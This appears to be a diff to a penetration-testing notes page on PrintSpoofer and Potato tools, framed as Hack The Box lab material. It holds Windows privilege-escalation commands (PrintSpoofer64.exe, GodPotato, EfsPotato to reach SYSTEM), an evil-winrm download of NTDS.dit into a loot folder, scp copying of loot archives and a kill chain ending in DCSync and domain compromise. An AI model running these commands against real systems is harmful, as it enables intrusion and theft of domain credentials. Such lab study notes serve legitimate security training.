@@ -9,6 +9,32 @@ hideFooterPagination: true
 
 {/* Generated from Commands/printspoofer.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## PrintSpoofer: choose the operation and read the result
+
+Commands and examples collected from your PrintSpoofer notes.
+
+### What the result establishes
+
+Verify the current token's impersonation privilege and the resulting process identity in the specific lab build.
+
+### Prerequisites and common failures
+
+The named privilege alone does not guarantee this technique works; service availability, patch level and endpoint behavior matter.
+
+### Example 1: B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```cmd
+.\PrintSpoofer64.exe -i -c cmd.exe
+:: or, very reliable on Server 2019:
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your PrintSpoofer notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=printspoofer) · [All tools](/index)
 
 ## B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move
@@ -20,6 +46,13 @@ hideFooterPagination: true
 :: or, very reliable on Server 2019:
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move](/cheatsheets/ad-attack-path-worked-example#b-abuse-seimpersonateprivilege-→-system-no-uac-needed-—-the-clean-htb-move)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -41,6 +74,13 @@ Saved as written; may include lab values or terminal output.
 *Evil-WinRM* PS> download C:\NTDS\NTDS.dit /home/kali/loot/ntds.dit    # built into evil-winrm
 *Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe            # the reverse
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -74,6 +114,13 @@ DCSync against DC01
 FULL DOMAIN COMPROMISE
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🗺️ The kill chain (this assessment)](/cheatsheets/ad-attack-path-worked-example#-the-kill-chain-this-assessment)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Pulling files FROM the target to Kali (the hard direction)">
@@ -104,6 +151,13 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 #    Kali:     echo '<paste>' | base64 -d > x
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)">
@@ -123,6 +177,13 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 .\EfsPotato.exe "cmd /c whoami"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)](/cheatsheets/windows-post-exploitation#a-seimpersonate-/-seassignprimarytoken-→-system-potato)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="PrintSpoofer (Printer Bug)">
@@ -140,6 +201,24 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 .\PrintSpoofer64.exe -d 3 -c "powershell -ep bypass"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — PrintSpoofer (Printer Bug)](/privesc/windows-privesc-checklist#printspoofer-printer-bug)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Active Directory Attack Path: Worked Lab](/cheatsheets/ad-attack-path-worked-example)
+- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+- [Windows Post-Exploitation: Field Reference](/cheatsheets/windows-post-exploitation)
+- [Pivoting and File Transfer: Field Reference](/cheatsheets/pivoting-file-transfer)
+
+{/* VAULT_RELATED_END */}
